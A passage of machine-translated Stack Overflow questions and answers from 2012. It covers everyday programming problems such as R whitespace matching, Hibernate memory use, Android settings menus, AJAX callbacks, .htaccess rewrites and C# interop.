[1] "unknown" "unknown" "unknown" "unknown" "unknown" "unknown" "unknown" "unknown" "unknown"

> Encoding(test.pasted)
[1] "unknown" "unknown" "unknown" "unknown" "unknown" "unknown" "unknown" "UTF-8"   "unknown" 
```

显然，有一些字符没有在 中分配`dput`，如下面的问题所示：

[如何正确输入国际化文本？](https://stackoverflow.com/questions/11369390/how-to-properly-dput-internationalized-text)

我无法复制/粘贴整个向量....如何搜索和销毁这个非空白空白？

**编辑**

显然，我什至没有弄清楚，因为答案无处不在。这是一个更简单的测试用例：

```
> grepl("Clinic Information:", test[2])
[1] FALSE
> grepl("Clinic Information:", "Clinic Information:") # Where the second phrase is copy/pasted from the screen
[1] TRUE 
```

在屏幕和输出中打印的单词“Clinic”和“Information”之间有一个空格`dput`，但字符串中的任何内容都不是标准空格。我的目标是消除这个，这样我就可以正确地 grep 那个元素了。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-07-28T20:51:11.087

将我的评论升级为答案：

您的字符串包含一个不间断空格 (U+00A0)，当您粘贴它时，该空格已转换为正常空格。使用 perl 风格的正则表达式可以轻松匹配 Unicode 中所有奇怪的类似空格的字符：

```
grepl("[0-9]+\\p{Zs}[A-Za-z ]+", test, perl=TRUE) 
```

perl 正则表达式语法是`\p{categoryName}`，额外的反斜杠是包含反斜杠的字符串语法的一部分，而“Zs”是“分隔符”Unicode 类别，“空格”子类别。仅针对 U+00A0 字符的更简单方法是

```
grepl("[0-9]+[ \\xa0][A-Za-z ]+", test) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-28T17:41:24.010

我看不出空格有什么异常，但电话号码中的破折号是`U+2010 (HYPHEN)`，而不是 ASCII 连字符 ( `U+002D`)。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-28T16:49:07.873

我认为你是在尾随和领先的空白之后。如果是这样，这个功能可能会起作用：

```
Trim <- function (x) gsub("^\\s+|\\s+$", "", x) 
```

还要留意标签等，这可能很有用：

```
clean <- function(text) {
    gsub("\\s+", " ", gsub("\r|\n|\t", " ", text))
} 
```

所以使用干净，然后使用修剪，如下所示：

```
Trim(clean(test)) 
```

还要注意破折号 (–) 和破折号 (-)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-07-28T17:09:07.837

```
test <- c("Address:", "Clinic Information:", "Store ", "351 South Washburn", 
"Aurora Quick Care", "Info", "St. Oshkosh, WI 54904", "Phone: 920‐232‐0718", 
"Pewaukee")

> grepl("[0-9]+ [A-Za-z ]+",test)
[1] FALSE FALSE FALSE  TRUE FALSE FALSE FALSE FALSE FALSE

library(stringr)
test2 <- str_trim(test, side = "both")

> grepl("[0-9]+ [A-Za-z ]+",test2)
[1] FALSE FALSE FALSE  TRUE FALSE FALSE FALSE FALSE FALSE
# So there were no spaces in the vector, just the screen output in this case. 
```

# java - 如何避免在成功的 Hibernate 保存后耗尽 Java 堆空间？

> ID：11702817
> 
> 赞同：1
> 
> 时间：2012-07-28T16:40:55.587
> 
> 标签：java, hibernate, heap-memory

我正在使用包括 Hibernate 数据存储的 Java 程序运行一些实验。一个 Experiment 可以包含多个 Trial，每个 Trial 可以有多个 Test。每个实验都在单个 Spring 事务中进行。

当有少量测试时，一切都很好，但随着数据量的增加，我开始遇到 Java 堆空间内存不足的问题。考虑到我在单个事务中处理的数据量，内存问题似乎是合理的。

我目前的解决方法是：

```
Set up and save the initial Experiment
Run a set of Tests.
Summarise the Test results and create a Trial record
Delete the Test records
Save the completed Trial
Prompt the Garbage Collector to run 
```

这很有效，我可以使用该框架进行广泛的实验。但是，我不再有权对详细的测试记录进行数据分析，因为我不得不删除它们以防止出现内存问题。

我想做的是将测试记录保存到文件中，然后从堆中“卸载”它们。试用版仍然会有一对多保存的测试记录，但由于测试已完成，我不再需要内存中的详细信息。

```
Set up and save the initial Experiment
Run a set of Tests.
Summarise the Test results and create a Trial record
Save the Trial (with cascade saves for all Test records)
Unload the complete Test records 
Prompt the Garbage Collector to run 
```

谁能想到我的问题的解决方案？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-28T16:57:00.680

为了防止你的对象在 Hibernate Session 中（并且能够被垃圾收集），你应该简单地将你的对象从 Hibernates 会话中分离出来（使用`session.evict()`）。`Test`在您的情况下，您应该在每次保存 a 后遍历所有实例`Trial`，逐出它们，然后也逐出您的实例`Trial`。

当您再次需要您的对象时，您可以使用普通的 Hibernate 方法（加载或查询）再次加载您的对象。`Trial.test`如果不需要它们，您可能应该考虑延迟加载。

# ios - GCD而不是游戏循环？

> ID：11702819
> 
> 赞同：3
> 
> 时间：2012-07-28T16:41:30.890
> 
> 标签：ios, grand-central-dispatch

我已经编写了一些事件驱动的 iOS 应用程序，但这并没有让我为我现在的工作做好充分的准备，我需要一些建议。

我有一个简单的策略游戏设计，我使用视图、动画块和手势识别器进行了原型设计。有了棋盘、招式和基本用户界面，我才刚刚开始创建 AI 玩家，并意识到我并不清楚最好的方法。我需要在不阻塞主线程的情况下生成 AI 移动事件和生成的动画。几年前我可能使用过经典的游戏循环模式，但我想避免在 iOS 中这样做，因为它不会让我觉得我可以在非游戏应用程序中使用它，我的目标之一是扩展我对如何构建 iOS 应用程序的理解。

我读过有关 GCD 的文章，我的感觉是可以使用 GCD 在主线程之外完成很多工作，但不清楚我将如何协调各个部分。例如，AI 需要评估棋盘，但每次参与者更改棋盘时，当前的评估都会失效。我是否设置了一个队列来管理董事会状态？我是否将每个 AI 玩家放在一个队列中？当 AI 选择最佳动作时，打断它的最佳方法是什么？

有没有人有我的应用程序需要支持这种架构的草图？我正在寻找我可以在一般情况下使用的模式，而不仅仅是在游戏中。如果有人知道这样的事情，我可以尝试的一些工作示例代码将是完美的。谢谢！

# c++ - 为什么我会在 MSVC 上收到此警告？

> ID：11702824
> 
> 赞同：0
> 
> 时间：2012-07-28T16:42:10.097
> 
> 标签：c++, visual-c++, boolean, warnings, compiler-warnings

```
bool image_manager::contains_image(const std::string& filename)
{
    return this->map_.count(filename);
} 
```

现在我得到的警告是：

```
warning C4800: 'unsigned int' : forcing value to bool 'true' or 'false' (performance warning) 
```

但是，由于`std::map`s count() 方法的返回类型是：

> 如果找到具有等效于 x 的键的元素，则为 1，否则为零。

因此它可以像布尔值一样使用。那么为什么我会收到这个警告呢？在 C++ 中，整数基本上可以用于布尔检查，对吗？因此`0 == false`和`1 == true`。那么为什么编译器会给我一个警告呢？我也尝试过使用`static_cast`这样的：

```
return static_cast<bool>(this->map_.count(filename)); 
```

但我仍然收到警告。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-28T16:46:18.747

一般来说， an`unsigned int`不是 a `bool`，因此是警告。尝试：

```
return this->map_.count(filename) > 0; 
```

反而。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-28T16:47:35.437

```
size_type count ( const key_type& x ) const; 
```

> 算术、无范围枚举、指针或指向成员类型的指针的纯右值可以转换为 bool 类型的纯右值。将零值、空指针值或空成员指针值转换为 false；任何其他值都将转换为 true。std::nullptr_t 类型的纯右值可以转换为 bool 类型的纯右值；结果值为假。

标准程序是格式良好的，并且应该适用于支持标准的所有编译器。

# memory - XNA 游戏可以使用超过 1.5GB 的 RAM 而不会崩溃吗？

> ID：11702830
> 
> 赞同：1
> 
> 时间：2012-07-28T16:42:52.510
> 
> 标签：memory, xna, out-of-memory

我想知道是否可以将大量纹理加载到 XNA 游戏的内存中，并且不会以某种方式出现内存异常。

特别是在运行时从文件流中加载纹理。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-07-29T15:30:09.343

这样做是一个可怕的想法，原因与可寻址系统内存的数量无关（正如您所指出的，由于 XNA 是一个 32 位库，因此限制在大约 2GB 左右）。

为了进行渲染，纹理必须加载到显卡的显存中。如今，高端台式机显卡有 2-3GB 左右；低端和中端卡的数量要少得多。此内存不仅用于纹理，还用于视频卡上存在的所有对象，例如顶点缓冲区。如果你不是在独占模式下运行，那么这个内存可能会在多个应用程序之间共享。由于交换，超过可用视频内存量将导致性能显着下降。

如果您真的打算填满该视频缓冲区（例如，您正在为 AAA 游戏编写超高端图形模式），则必须使用一些涉及 Win32 API 的高级内存寻址技术或将纹理加载到图形设备中，而不在系统内存中保留副本。这些技术超出了 XNA 的范围。

# android - Android：让用户访问偏好活动的最佳方式？

> ID：11702831
> 
> 赞同：2
> 
> 时间：2012-07-28T16:42:53.597
> 
> 标签：android, mobile

我正在制作一个应用程序，并且有一个首选项活动，允许用户选择应用程序的设置。

我需要帮助的是选择用户如何访问偏好活动。一些教程实际上在主活动中有一个标记为“首选项”的按钮，它允许用户访问该活动。

其他人（我目前的方式）只是依靠用户点击手机上的菜单按钮。我读到有些手机不再有菜单按钮，Android 团队正试图摆脱物理导航按钮的要求。

所以我有点困惑，关于这个话题的普遍共识是什么？谢谢你。

编辑：这是我当前的菜单创建代码

```
@Override
    public boolean onCreateOptionsMenu(Menu menu) {
        menu.add(Menu.NONE, 0, 0, "Settings");
        return super.onCreateOptionsMenu(menu);
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        switch (item.getItemId()) {
        case 0:
            startActivity(new Intent(this, Preferences.class));
            return true;
        }
        return false;
    } 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-28T16:55:26.003

使用“菜单按钮”方法。通常，在英语中，该按钮应称为“设置”，而不是“首选项”，即使它管理首选项。傻，我知道。

关于没有菜单按钮的手机：

唯一不运行 Android 4.0 或更高版本的手机。只要您的项目构建中的目标 Android 3.0 或更高版本，并正确创建菜单项（如果您需要知道如何创建，我将提供一个片段），Android 将检测到没有硬件菜单按钮并添加“溢出”菜单到操作栏。

编辑：这是片段：

```
@Override
public boolean onCreateOptionsMenu(Menu menu) {
    MenuItem buttonSettings = menu.add("Settings"); // This is a hardcoded string. When you get around to it, switch it to a localized String resource.
    buttonSettings.setIcon(R.drawable.ic_settings); // I have a custom icon for this. You can use the one in android.R.drawable, but I don't know its name right now.
    buttonSettings.setShowAsAction(MenuItem.SHOW_AS_ACTION_NEVER); // This forces it to go in the overflow menu, which is preferred.
    buttonSettings.setOnMenuItemClickListener(new MenuItem.OnMenuItemClickListener() {

        public boolean onMenuItemClick(MenuItem item) {
            Intent settingsIntent = new Intent(YourActivity.this, Preferences.class); // Change YourActivity to.. well, your activity. Change Preferences to the name of your Settings activity.
            YourActivity.this.startActivity(settingsIntent);
            return false; // I honestly don't know why this should return false, but every example I've seen has it do so. So I'd leave it in.
        }
    });
return true;
} 
```

溢出菜单看起来像三个点，就像操作栏的“更多...”选项。Android 设计指南说您应该始终将设置选项放在溢出菜单中。

希望能解惑，有什么其他的，欢迎提问。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-28T21:05:34.250

感谢大家的帮助，尤其是史蒂文的帮助，我了解到以下内容：

*   对于 Android 3.0+，访问我的 Preference 活动的有效方法是实现操作栏
*   可以通过将主题更改为 Theme.Holo 来添加操作栏，该主题可在 3.0+ 平台上使用
*   因为我的手机是 2.2，所以当我在 manifest 文件中设置 Holo 主题时没有找到，这是因为我的构建目标是 2.2
*   我最初将 minSdkVersion 更改为 11 以使主题能够正常工作，但这意味着我将无法在我的手机上对其进行测试，并且 Android 版本低于 3.0 的人将无法使用我的应用程序，如果他们想要
*   实际的方法是进入 Project>Preferences>Android 并将构建目标设置为最新版本的 Android（这样，具有更高操作系统版本的手机可以从更新的主题相关更改中受益，而旧版本不受影响）
*   设置更高的构建目标时要注意的一件事是您使用的类的兼容性。某些类可能仅适用于较高版本的 Android，因此会导致您的应用在较低版本上崩溃。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-28T17:06:00.017

我建议你两者都做（这就是我所做的）。您 `virtual button`在屏幕上显示了一个设置，当单击它时，会弹出设置屏幕。当您点击 时，您可以选择`physical button`弹出设置屏幕。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-07-28T18:09:29.293

一些比我更聪明（并且更美观）的人在 Android 设计指南中讨论了[设置。](http://developer.android.com/design/patterns/settings.html)

我的通用 UI 设计原则是：

1.  您一直在做的事情应该通过屏幕（内容区域或 ActionBar 操作）控件来访问。
2.  您每天执行一次的操作应在菜单的顶层（或仅在主屏幕上的屏幕上）访问。
3.  您很少做的事情（例如更改用户首选项）可以随心所欲地隐藏在菜单层次结构中。:-)

在实践中，我通常希望设置位于主 Activity 的第一个溢出级别。

# quotation-marks - 如何更改我网站上的“

> ID：11702832
> 
> 赞同：0
> 
> 时间：2012-07-28T16:42:58.960
> 
> 标签：quotation-marks

我在我的博客中安装了一个新主题。我注意到主题将引号“”显示为“”。请帮我解决这个问题。我不希望这些引号为“”，我希望它们简单的“”。请帮忙。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-28T16:46:58.527

很可能是主题的字体决定了“如何显示..

如果您进入样式表（css 文件），则可以更改字体系列。

# opa - 是否可以在单个命令中编译 src 目录？

> ID：11702833
> 
> 赞同：0
> 
> 时间：2012-07-28T16:43:00.213
> 
> 标签：opa

我想在一个命令中编译我的 src 目录中的所有 .opa 文件，而不必手动指定每个文件，也不必在配置文件中手动指定它们。

这是 Java 中的并行问题：[Building Java package (javac to all files)](https://stackoverflow.com/questions/2356443/building-java-package-javac-to-all-files) 在这里：[Compiling java files in all subfolders?](https://stackoverflow.com/questions/5194926/compiling-java-files-in-all-subfolders)

我需要对makefile做些什么吗？Opa 是否有 Ant 等价物？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-28T22:24:24.540

`opa src/*.opa`应该管用 ;）

否则，我猜这只是基本的 Makefile 操作。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-29T11:10:55.917

用于`opa create`生成示例 MVC 应用程序。它将包含用于编译整个项目的基本文件`Makefile`和文件。包含编译和运行项目的命令。使用命令查看结果。文件描述文件之间的依赖关系。工具允许使用文件系统通配符，您应该能够轻松更改配置文件。`opa.conf``Makefile``make``opa.conf``*.opa``make`

看看介绍[手册](http://www.gnu.org/software/make/manual/html_node/index.html)的[博客文章](http://blog.opalang.org/2012/06/programming-tools-ux-how-we-simplified.html)（它很长，因为它有很多您可能不需要的功能，但您可以从示例开始）`opa create``make`

# html - 在一个网页上使用多种自然（人类）语言的最佳实践？

> ID：11702834
> 
> 赞同：2
> 
> 时间：2012-07-28T16:43:24.283
> 
> 标签：html, utf-8, character-encoding

使用 UTF-8 编码。（[一个 HTML 页面中的多种语言](https://stackoverflow.com/questions/9019844/multiple-languages-in-one-html-page)）。

跨不同浏览器（包括 iPad 上的 Safari）在单个网页上正确显示多种人类语言的最佳实践是什么？

META 语言标签使用什么？

在 Rails 中工作。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-28T17:31:37.337

如果没有意义，请不要为整个页面声明一种语言。`lang`取而代之的是，为您拥有的每个`div`或`span`或什么使用 HTML属性。

网站很少使用详细的语言注释（更罕见的是它们要保持一致和准确），但我相信这将构成当前的最佳实践。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-28T19:43:00.253

你不需要任何特别的东西。渲染不需要在标记中指示语言。这主要只是一个原则问题，但如果您希望使用它，只需使用`<html lang="...">`来指示主要语言，并`lang`为包含另一种语言文本的任何块指定另一种语言的属性。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-29T10:17:00.893

如果您正在混合从右到左的语言（阿拉伯语、希伯来语）和从左到右的语言，您需要声明文本块的方向。如果大部分文本是从左到右的，你只需要声明从右到左的段落：

```
<html dir="ltr">
    <p>English text</p>
    <p dir="rtl">العربية text</p> <!-- should render as "text العربية" -->
</html> 
```

声明语言并不像 Tripleee 和 Jukka 所说的那么重要。

# doctrine-orm - Doctrine2 找到一个不存在的实体

> ID：11702835
> 
> 赞同：0
> 
> 时间：2012-07-28T16:43:29.683
> 
> 标签：doctrine-orm

如果在 Doctrine2 中我与实体管理器一起执行以下操作，会发生什么情况。

```
$object = $em->find( 'MyModel\User', -999 ); 
```

对象是否为假，是否为用户对象，是否引发异常？基本上，如何根据某些标准测试数据库中是否存在一行？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-10T03:42:50.090

从Doctrine2手册中，

如果没有找到具有给定标识符的实例，则返回值是找到的实体实例或 null。

[教义手动输入](http://docs.doctrine-project.org/projects/doctrine-orm/en/latest/reference/working-with-objects.html#by-primary-key)

# png - 最优精灵表算法

> ID：11702837
> 
> 赞同：1
> 
> 时间：2012-07-28T16:43:46.570
> 
> 标签：png, sprite, css-sprites, filesize

关于 spritesheets，我注意到的一件事是它们的文件大小并不完全一致。当您有单个图像时，假设它们被正确压缩，它们的文件大小不会改变。但是对于 spritesheets，图像的文件大小可能会根据图像的排列方式而有很大差异。

例如，我创建了这个 spritesheet：
[Sheet http://pokebattlers.net/img/misc/forumstars.png](http://pokebattlers.net/img/misc/forumstars.png)我尝试了水平，我尝试了纵向和横向的 2x3，我尝试了所有`6! = 720`可能的图像排列，以及我发现的是星星的顺序完全没有区别（我真的没想到会这样，因为图像已被索引，所以所有改变的只是重新排列的调色板），但是垂直布局产生的文件比其他任何文件都小。

是否有任何算法可以帮助确定 spritesheet 中图像的最佳排列，或者它只是暴力“尝试一切并找到最小的”的情况？

另外，为什么在这个和我尝试过的其他少数情况下，垂直排列产生的文件比水平排列的文件更小？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-24T21:06:05.270

我不知道算法，但我可以分享我的经验：

*   垂直精灵！水平方向的文件大小更大
*   将颜色组合在一起（粉碎和压缩会增加）
*   使用白色背景（文件大小小于透明背景）
*   从图像的调色板中删除不需要的颜色

高温高压

格克斯塔

# .htaccess - 如何使用 .htaccess 重命名或修改查询字符串的一部分

> ID：11702839
> 
> 赞同：0
> 
> 时间：2012-07-28T16:44:02.633
> 
> 标签：.htaccess

我需要

```
http://somehost.com/?p=whatever&nothis=somevar 
```

要去

```
http://somehost.com/?p=whatever&this=somevar 
```

只是试图将查询的“nothis”部分更改为“this”！

一直在敲我的头，无法弄清楚！

我需要在这里快速上一课。非常感谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-28T20:30:27.330

尝试将此添加到文档根目录中的 htaccess 文件中：

```
RewriteEngine On
RewriteCond %{QUERY_STRING} ^(.*)nothis=somevar(.*)$
RewriteRule ^(.*)$ /$1?%1this=somevar%2 [L] 
```

# php - 使用 PHP 的 AJAX 请求

> ID：11702841
> 
> 赞同：-2
> 
> 时间：2012-07-28T16:44:08.893
> 
> 标签：php, javascript, ajax

我想在单击按钮时触发 AJAX 请求，但我无法在后端触发它。

**索引.php**：

```
<html>
    <head>
        <script type="text/javascript">
            var req = new XMLHttpRequest();
            function send1()
            {
                req.open("GET", "process.php?q=hello", true);
                req.send();         
                alert(req.responseText);      
            }
        </script>
    </head>    

    <button onclick=send1()>send</button>

</html> 
```

**进程.php**：

```
<?php
$new= $_GET['q'];
echo $new;
?> 
```

这应该在警报框中给我“你好”，为什么不是？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-07-28T16:46:56.753

AJAX 中的第一个 A 表示“异步”。你需要做的是监听 readyState 的变化：

```
req.open(...);
req.onreadystatechange = function() {
    if( this.readyState == 4) {
        if( this.status == 200) alert(this.responseText);
        else alert("HTTP error "+this.status+" "+this.statusText);
    }
};
req.send(); 
```

# android - Android 上的应用内结算发生了一些变化

> ID：11702842
> 
> 赞同：4
> 
> 时间：2012-07-28T16:44:20.233
> 
> 标签：android, google-play, in-app-billing, android-pay

过去几天我一直在测试应用购买，我看到 Google Play 发生了一些变化。从昨天开始，在某些情况下，我收到了其他回复，甚至我的 Google 钱包中的登录信息也与以前不同（请查看下面的屏幕截图）。

![自 7 月 27 日以来 GW 计费记录之间的差异](../Images/6b58a82e90fd9e2e53a4463f8c429383.png)

**这是我的问题**

让我们给它一个这样的场景：

1.  尝试在相关信用卡上没有资金的情况下购买真正的订阅产品 - 好的 Google Play 显示对话框并建议我们检查 Google 钱包，所以我要去那里，一切看起来都很好（除了我的信用卡上没有钱 - 确实是虚拟预付卡，另一件事是当我单击链接以更新付款信息时，我被重定向到我的交易）
2.  在 Google 电子钱包中取消您的订单
3.  再次尝试购买，我得到“您已经购买了此商品，或购买仍在等待中”对话框。无论事务是否恢复以及花费了多少时间（现在我在第一次尝试后大约 24 小时）。即使我的卡上有钱，我也会收到此回复

最后我无法购买我的产品。**所以我的问题是 - 如何解决我的问题？究竟发生了什么变化？**除了登录钱包和尝试购买和取消无资金通知之间的时间延迟（现在是即时的，但最多 27 分钟 - 首先是已购买状态，然后是已取消）。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-31T09:20:06.410

我在大约几周内遇到了同样的错误。我已经联系了 Google Play 支持团队，他们确认了他们的问题。他们还感到遗憾的是，修复程序现在已经处于测试阶段，应该很快就会部署。

# url - “服务器到服务器”跟踪方法（用于重定向目的）如何工作？

> ID：11702845
> 
> 赞同：0
> 
> 时间：2012-07-28T16:44:43.833
> 
> 标签：url, redirect, url-routing, server-to-server

我的公司有多种方式通过网络服务发送信息。一种称为“服务器到服务器”，据我了解，这意味着它对客户端/网络用户是不可见的。但我不明白这如何适合重定向。

我只是对此感到困惑以及它是如何工作的，欢迎任何提示/指针/评论。谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-29T04:43:53.183

因此，您使用 CURL 等进行服务器到服务器的通信，第二个服务器返回一个 URL，第一个服务器现在将用户发送到该 URL。这允许您将数据私下传送到用户无法更改的第二台服务器。这将用于为他们预填充页面。

# android - Android - 碰撞检测/引擎优化 - 大型、开放、沙盒地图

> ID：11702847
> 
> 赞同：0
> 
> 时间：2012-07-28T16:44:45.657
> 
> 标签：android, optimization, collision-detection, game-engine

**简洁版本**

在动态生成对象的大型开放地图中检测碰撞的性能友好方式是什么？

**长版**

我目前正在重新创建我制作的第一款 Android 游戏（[https://play.google.com/store/apps/details?id=com.Joey_Ant.Lite&feature=search_result#?t=W251bGwsMSwyLDEsImNvbS5Kb2V5X0FudC5MaXRlIl0。](https://play.google.com/store/apps/details?id=com.Joey_Ant.Lite&feature=search_result#?t=W251bGwsMSwyLDEsImNvbS5Kb2V5X0FudC5MaXRlIl0.)）

我正在从头开始重建它并添加大约一百个新功能。

**游戏描述：**用户将控制一个拥有地下、基于网格的地图和地上开放运动场的蚁群。蚂蚁会有人工智能，可能会有大量的蚂蚁。（这意味着我需要优化所有东西。）地图将是高度可变的。（我计划制作一个地图创建器，让用户在线创建和下载地图。）

那么，在充满大量物体和其他蚂蚁/生物的地图中，检测碰撞的最佳方法是什么？我不能循环遍历所有其他对象来检测碰撞，因为每个生物都必须发生这种情况，并且会占用过多的 CPU 时间。

**我所考虑的**

**Grid** : 创建任意网格对象。网格对象将创建子区域（实际网格）并且每次生物“思考”。它将使用对自身的引用来更新网格对象。然后，该生物将向网格对象询问其网格内的其他对象。这有望大大减少需要进行的检查次数。但这样做的开销可能更多。该网格也可能有利于允许生物检测其一般区域中的其他生物，因为 AI 决策将受到该区域中的其他物体和生物的影响。

**Occupied Grids**：与上面的grid选项基本相同，只是grid对象是由objects创建的。假设我有 3 个对象（A、B 和 C）。当我初始化对象 A 时，它会创建一个具有指定宽度和高度的网格单元。对象 B 已初始化，但与对象 A 位于同一区域，因此它将自身添加到该网格区域。对象 C 在区域外初始化，因此它为其位置创建了一个网格单元。如果对象 C 进入对象 A 所在的单元格，则其先前的单元格被破坏。我猜你可以把它想象成吹泡泡。

有更好的方法来做到这一点吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-26T13:31:09.573

这是一个相当古老的问题，我不知道您是否找到了解决方案，但为什么不使用已经开发的碰撞检测和物理引擎之一，而不是发明热水。以下是一些可能性：

1.  [androidbox2d](http://code.google.com/p/androidbox2d/)

2.  [和引擎](http://www.andengine.org/)

也有很好的例子如何使用它们。

# android - getLastKnownLocations 始终返回 null

> ID：11702848
> 
> 赞同：0
> 
> 时间：2012-07-28T16:44:46.053
> 
> 标签：android, location

我无法在我的 Android 设备（Samsung Galaxy Note N7000）上获取LastKnownLocations，因为它始终为空，塔被检测为网络，所以很好，有人知道如何获取我的位置吗？

```
 d = getResources().getDrawable(R.drawable.songs_gray);

    //Placing pinpoint at location
    lm = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
    Criteria crit = new Criteria();

    towers = lm.getBestProvider(crit, false);

    Toast.makeText(LocationActivity.this, "Towers: " + towers, Toast.LENGTH_SHORT).show();

    Location location = lm.getLastKnownLocation(towers);

    Toast.makeText(LocationActivity.this, "Location: " + location, Toast.LENGTH_SHORT).show();

    if(location !=null){
        lat = (int) (location.getLatitude()*1E6);
        longi = (int) (location.getLongitude()*1E6);
        GeoPoint ourLocation = new GeoPoint(lat, longi);
        OverlayItem overlayItem = new OverlayItem(ourLocation, "What's up", "2nd String");
        CustomPinpoint custom = new CustomPinpoint(d, LocationActivity.this);
        custom.insertPinPoint(overlayItem);
        overlayList.add(custom);    
    }else{
        Toast.makeText(LocationActivity.this, "Couldn't get provider", Toast.LENGTH_SHORT).show();
    } 
```

显现

```
<uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
<uses-permission android:name="android.permission.ACCESS_MOCK_LOCATION" /> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-28T16:54:21.377

只有在指定的位置提供程序处于活动状态时，`getLastKnownLocation()`您才能获取对象。`Location`

文档说：

> 返回一个 Location 指示从给定提供程序获得的最后一个已知位置修复的数据。这可以在不启动提供程序的情况下完成。请注意，此位置可能已过时，例如，如果设备已关闭并移动到另一个位置。
> 
> 如果提供程序当前被禁用，则返回 null。

要检测当前位置而不是最后检测到的位置，您需要启用位置提供程序。[本教程](http://www.vogella.com/articles/AndroidLocationAPI/article.html)将帮助您了解如何与 GPS 和网络等位置提供程序一起工作。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-28T16:52:53.117

仅当该位置已在您的呼叫之前由另一个应用程序确定时，最后一个已知位置才可用。启动地图或其他应用程序并让它获得位置锁定。然后运行您的应用程序。

如果你真的*需要*在你的应用程序中定位，你需要回退到其他方法，因为你不能依赖最后一个已知的位置。

作为旁注，`ACCESS_MOCK_LOCATION`这里不需要。从文档中，

> 允许应用程序创建模拟位置提供程序以进行测试

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-28T16:57:02.350

没关系发现我的问题！只需要在我的手机上使用 Google 的定位服务

# c# - 为疯狂的 C 导出提供互操作

> ID：11702849
> 
> 赞同：2
> 
> 时间：2012-07-28T16:44:49.623
> 
> 标签：c#, c++, c, interop, marshalling

我在将以下几行翻译成 C# 时遇到问题：

```
extern leveldb_filterpolicy_t* leveldb_filterpolicy_create(
    void* state,
    void (*destructor)(void*),
    char* (*create_filter)(
        void*,
        const char* const* key_array, const size_t* key_length_array,
        int num_keys,
        size_t* filter_length),
    unsigned char (*key_may_match)(
        void*,
        const char* key, size_t length,
        const char* filter, size_t filter_length),
    const char* (*name)(void*)); 
```

这个函数是从本机 dll 导出的，我需要从 C# 调用它，我知道 , `destructor`, `create_filter`,`key_may_match`是`name`C# 中的代表，但是`const char* const*`类型让我偶然发现它在 C# 中的外观，我的主要问题是是否可以编组这些通过 MarshalAs 属性使用标准方法的值，

顺便说一句，我对更简单的构造没有任何问题，例如：

```
public class Driver
{
    static void Validate(string error)
    {
        if (!String.IsNullOrEmpty(error))
        {
            throw new ApplicationException(error);
        }
    }

    public static extern leveldb_t leveldb_open(leveldb_options_t options, [param: MarshalAs(UnmanagedType.LPStr)] String name, out string error);
    public static extern void leveldb_close(leveldb_t db);
    public static extern void leveldb_put(leveldb_t db, leveldb_writeoptions_t options, byte[] key, size_t keylen, byte[] val, size_t vallen, out string error);
    public static extern void leveldb_delete(leveldb_t db, leveldb_writeoptions_t options, byte[] key, size_t keylen, out string error);
    public static extern void leveldb_write(leveldb_t db, leveldb_writeoptions_t options, leveldb_writebatch_t batch, out string error);

    // Returns NULL if not found.  A malloc()ed array otherwise. Stores the length of the array in *vallen.
    [return: MarshalAs(UnmanagedType.LPArray, SizeParamIndex=4)]
    public static extern byte[] leveldb_get(leveldb_t db, leveldb_readoptions_t options, byte[] key, size_t keylen, out size_t vallen, out string error);
    public static extern leveldb_iterator_t leveldb_create_iterator(leveldb_t db, leveldb_readoptions_t options);
    public static extern leveldb_snapshot_t leveldb_create_snapshot(leveldb_t db);
    public static extern void leveldb_release_snapshot(leveldb_t db, leveldb_snapshot_t snapshot);

    [return: MarshalAs(UnmanagedType.LPStr)] 
    public static extern String leveldb_property_value(leveldb_t db, [param: MarshalAs(UnmanagedType.LPStr)] String propname); // Returns NULL if property name is unknown. Else returns a pointer to a malloc()-ed null-terminated value.

    ...
} 
```

# feedparser - 使用 feedparser 访问 openSearch:totalResults

> ID：11702853
> 
> 赞同：4
> 
> 时间：2012-07-28T16:45:38.570
> 
> 标签：feedparser

如何使用 feedparser 检索 openSearch:totalResults 属性？

我有一个博客 API 结果，看起来有点像这样（我已经剪掉了一些东西以使其紧凑）

```
 <feed xmlns='http://www.w3.org/2005/Atom'
  xmlns:openSearch='http://a9.com/-/spec/opensearch/1.1/'
  xmlns:gd='http://schemas.google.com/g/2005'
  gd:etag='W/"CUYMQ348fyp7ImA9WB9UFkU."'>
 <id>tag:blogger.com,1999:blog-blogID.postpostID..comments</id>
 <updated>2007-12-14T17:46:22.077-08:00</updated>
 <title>Comments on Lizzy's Diary: Quite disagreeable</title>  
 <generator version='7.00'
   uri='http://www.blogger.com'>Blogger</generator>
 <openSearch:totalResults>1</openSearch:totalResults>
 <openSearch:startIndex>1</openSearch:startIndex> 
```

目前，我做类似的事情

```
req = urllib.urlopen(url)
urlContent = req.read()            
feed = feedparser.parse(urlContent)
print feed.feed['openSearch_totalResults'] 
```

